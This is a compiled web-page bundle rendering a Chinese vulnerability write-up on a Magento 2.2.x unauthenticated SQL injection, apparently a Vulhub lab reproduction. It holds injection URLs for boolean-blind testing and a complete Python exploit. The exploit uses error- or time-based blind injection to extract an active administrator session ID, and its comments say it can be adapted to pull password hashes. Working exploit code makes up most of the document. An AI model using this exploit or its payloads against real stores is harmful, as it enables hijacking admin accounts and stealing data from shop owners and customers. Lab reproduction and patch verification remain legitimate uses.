import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Magento（麦进斗）是一款新的专业开源电子商务平台，采用php进行开发，使用Zend Framework框架。设计得非常灵活，具有模块化架构体系和丰富的功能。",-1),d=n("p",null,"其prepareSqlCondition函数存在一处二次格式化字符串的bug，导致引入了非预期的单引号，造成SQL注入漏洞。",-1),k=n("p",null,"参考链接：",-1),v={href:"https://www.ambionics.io/blog/magento-sqli",target:"_blank",rel:"noopener noreferrer"},m={href:"https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html",target:"_blank",rel:"noopener noreferrer"},b=e(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动Magento 2.2.7：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>，即可看到Magento的安装页面。安装Magento时，数据库地址填写<code>mysql</code>，账号密码均为<code>root</code>，其他保持默认：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262127885.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>分别访问如下链接：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-vp-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&amp;ids[0][added_at]=&amp;ids[0][product_id][from]=%3f&amp;ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262131770.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&amp;ids[0][added_at]=&amp;ids[0][product_id][from]=%3f&amp;ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262131576.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，在执行<code>))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -</code>和<code>))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -</code>时，返回的HTTP状态码不同。</p><p>通过改变OR的条件，即可实现SQL BOOL型盲注。</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,14),g={href:"https://github.com/ambionics/magento-exploits",target:"_blank",rel:"noopener noreferrer"},f=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment"># Magento 2.2.0 &lt;= 2.3.0 Unauthenticated SQLi</span>
<span class="token comment"># Charles Fol</span>
<span class="token comment"># 2019-03-22</span>
<span class="token comment">#</span>
<span class="token comment"># SOURCE &amp; SINK</span>
<span class="token comment"># The sink (from-to SQL condition) has been present from Magento 1.x onwards.</span>
<span class="token comment"># The source (/catalog/product_frontend_action/synchronize) from 2.2.0.</span>
<span class="token comment"># If your target runs Magento &lt; 2.2.0, you need to find another source.</span>
<span class="token comment">#</span>
<span class="token comment"># SQL INJECTION</span>
<span class="token comment"># The exploit can easily be modified to obtain other stuff from the DB, for</span>
<span class="token comment"># instance admin/user password hashes.</span>
<span class="token comment">#</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> re
<span class="token keyword">import</span> random
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>category<span class="token operator">=</span>InsecureRequestWarning<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sqli <span class="token operator">=</span> SQLInjection<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        sqli<span class="token punctuation">.</span>find_test_method<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sid <span class="token operator">=</span> sqli<span class="token punctuation">.</span>get_most_recent_session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ExploitError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Error: %s&#39;</span> <span class="token operator">%</span> e<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">random_string</span><span class="token punctuation">(</span>n<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">ExploitError</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>


<span class="token keyword">class</span> <span class="token class-name">Browser</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;Basic browser functionality along w/ URLs and payloads.
    &quot;&quot;&quot;</span>
    PROXY <span class="token operator">=</span> <span class="token boolean">None</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> URL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>URL <span class="token operator">=</span> URL
        self<span class="token punctuation">.</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>s<span class="token punctuation">.</span>verify <span class="token operator">=</span> <span class="token boolean">False</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>PROXY<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>s<span class="token punctuation">.</span>proxies <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;http&#39;</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>PROXY<span class="token punctuation">,</span>
                <span class="token string">&#39;https&#39;</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>PROXY<span class="token punctuation">,</span>
            <span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">SQLInjection</span><span class="token punctuation">(</span>Browser<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;SQL injection stuff.
    &quot;&quot;&quot;</span>

    <span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&#39;0x&#39;</span> <span class="token operator">+</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">find_test_method</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;Tries to inject using an error-based technique, or falls back to timebased.
        &quot;&quot;&quot;</span>
        <span class="token keyword">for</span> test_method <span class="token keyword">in</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>test_error<span class="token punctuation">,</span> self<span class="token punctuation">.</span>test_timebased<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> test_method<span class="token punctuation">(</span><span class="token string">&#39;123=123&#39;</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> test_method<span class="token punctuation">(</span><span class="token string">&#39;123=124&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>test <span class="token operator">=</span> test_method
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ExploitError<span class="token punctuation">(</span><span class="token string">&#39;Test SQL injections failed, not vulnerable ?&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">test_timebased</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> condition<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;Runs a test. A valid condition results in a sleep of 1 second.
        &quot;&quot;&quot;</span>
        payload <span class="token operator">=</span> <span class="token string">&#39;))) OR (SELECT*FROM (SELECT SLEEP((%s)))a)=1 -- -&#39;</span> <span class="token operator">%</span> condition
        r <span class="token operator">=</span> self<span class="token punctuation">.</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
            self<span class="token punctuation">.</span>URL <span class="token operator">+</span> <span class="token string">&#39;/catalog/product_frontend_action/synchronize&#39;</span><span class="token punctuation">,</span>
            params<span class="token operator">=</span><span class="token punctuation">{</span>
                <span class="token string">&#39;type_id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;recently_products&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;ids[0][added_at]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;ids[0][product_id][from]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;?&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;ids[0][product_id][to]&#39;</span><span class="token punctuation">:</span> payload
            <span class="token punctuation">}</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">return</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span>

    <span class="token keyword">def</span> <span class="token function">test_error</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> condition<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;Runs a test. An invalid condition results in an SQL error.
        &quot;&quot;&quot;</span>
        payload <span class="token operator">=</span> <span class="token string">&#39;))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE %s) -- -&#39;</span> <span class="token operator">%</span> condition
        r <span class="token operator">=</span> self<span class="token punctuation">.</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
            self<span class="token punctuation">.</span>URL <span class="token operator">+</span> <span class="token string">&#39;/catalog/product_frontend_action/synchronize&#39;</span><span class="token punctuation">,</span>
            params<span class="token operator">=</span><span class="token punctuation">{</span>
                <span class="token string">&#39;type_id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;recently_products&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;ids[0][added_at]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;ids[0][product_id][from]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;?&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;ids[0][product_id][to]&#39;</span><span class="token punctuation">:</span> payload
            <span class="token punctuation">}</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ExploitError<span class="token punctuation">(</span>
                <span class="token string">&#39;SQL injection does not yield a correct HTTP response&#39;</span>
            <span class="token punctuation">)</span>
        <span class="token keyword">return</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">400</span>

    <span class="token keyword">def</span> <span class="token function">word</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> sql<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> charset<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;Dichotomically obtains a value.
        &quot;&quot;&quot;</span>
        pattern <span class="token operator">=</span> <span class="token string">&#39;LOCATE(SUBSTR((%s),%d,1),BINARY %s)=0&#39;</span>
        full <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>

        check <span class="token operator">=</span> <span class="token boolean">False</span>
        
        <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token comment"># Yeah whatever</span>
            size_size <span class="token operator">=</span> self<span class="token punctuation">.</span>word<span class="token punctuation">(</span>
                name<span class="token punctuation">,</span>
                <span class="token string">&#39;LENGTH(LENGTH(%s))&#39;</span> <span class="token operator">%</span> sql<span class="token punctuation">,</span>
                size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
                charset<span class="token operator">=</span>string<span class="token punctuation">.</span>digits
            <span class="token punctuation">)</span>
            size <span class="token operator">=</span> self<span class="token punctuation">.</span>word<span class="token punctuation">(</span>
                name<span class="token punctuation">,</span>
                <span class="token string">&#39;LENGTH(%s)&#39;</span> <span class="token operator">%</span> sql<span class="token punctuation">,</span>
                size<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>size_size<span class="token punctuation">)</span><span class="token punctuation">,</span>
                charset<span class="token operator">=</span>string<span class="token punctuation">.</span>digits
            <span class="token punctuation">)</span>
            size <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;%s: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> full<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;\\r&#39;</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
            c <span class="token operator">=</span> charset
            
            <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>
                middle <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
                h0<span class="token punctuation">,</span> h1 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token punctuation">:</span>middle<span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span>middle<span class="token punctuation">:</span><span class="token punctuation">]</span>
                condition <span class="token operator">=</span> pattern <span class="token operator">%</span> <span class="token punctuation">(</span>sql<span class="token punctuation">,</span> p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>h0<span class="token punctuation">)</span><span class="token punctuation">)</span>
                c <span class="token operator">=</span> h1 <span class="token keyword">if</span> self<span class="token punctuation">.</span>test<span class="token punctuation">(</span>condition<span class="token punctuation">)</span> <span class="token keyword">else</span> h0

            full <span class="token operator">+=</span> c
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;%s: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> full<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;\\r&#39;</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39; &#39;</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">&quot;%s: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> full<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;\\r&#39;</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> full

    <span class="token keyword">def</span> <span class="token function">get_most_recent_session</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;Grabs the last created session. We don&#39;t need special privileges aside from creating a product so any session
        should do. Otherwise, the process can be improved by grabbing each session one by one and trying to reach the
        backend.
        &quot;&quot;&quot;</span>
        <span class="token comment"># This is the default admin session timeout</span>
        session_timeout <span class="token operator">=</span> <span class="token number">900</span>
        query <span class="token operator">=</span> <span class="token punctuation">(</span>
            <span class="token string">&#39;SELECT %%s FROM admin_user_session &#39;</span>
            <span class="token string">&#39;WHERE TIMESTAMPDIFF(SECOND, updated_at, NOW()) BETWEEN 0 AND %d &#39;</span>
            <span class="token string">&#39;ORDER BY created_at DESC, updated_at DESC LIMIT 1&#39;</span>
        <span class="token punctuation">)</span> <span class="token operator">%</span> session_timeout

        <span class="token comment"># Check if a session is available</span>

        available <span class="token operator">=</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>test<span class="token punctuation">(</span><span class="token string">&#39;(%s)=0&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>query <span class="token operator">%</span> <span class="token string">&#39;COUNT(*)&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token keyword">not</span> available<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ExploitError<span class="token punctuation">(</span><span class="token string">&#39;No session is available&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;An admin session is available !&#39;</span><span class="token punctuation">)</span>

        <span class="token comment"># Fetch it</span>

        sid <span class="token operator">=</span> self<span class="token punctuation">.</span>word<span class="token punctuation">(</span>
            <span class="token string">&#39;Session ID&#39;</span><span class="token punctuation">,</span>
            query <span class="token operator">%</span> <span class="token string">&#39;session_id&#39;</span><span class="token punctuation">,</span>
            charset<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span>
            size<span class="token operator">=</span><span class="token number">26</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Session ID: %s&#39;</span> <span class="token operator">%</span> sid<span class="token punctuation">)</span>
        <span class="token keyword">return</span> sid

run<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function h(_,y){const a=o("ExternalLinkIcon");return i(),c("div",null,[u,r,d,k,n("ul",null,[n("li",null,[n("a",v,[s("https://www.ambionics.io/blog/magento-sqli"),t(a)])]),n("li",null,[n("a",m,[s("https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html"),t(a)])])]),b,n("p",null,[s("利用"),n("a",g,[s("这个POC"),t(a)]),s("，可以读取管理员的session：")]),f])}const E=p(l,[["render",h],["__file","Magento 2.2 SQL注入漏洞.html.vue"]]);export{E as default};
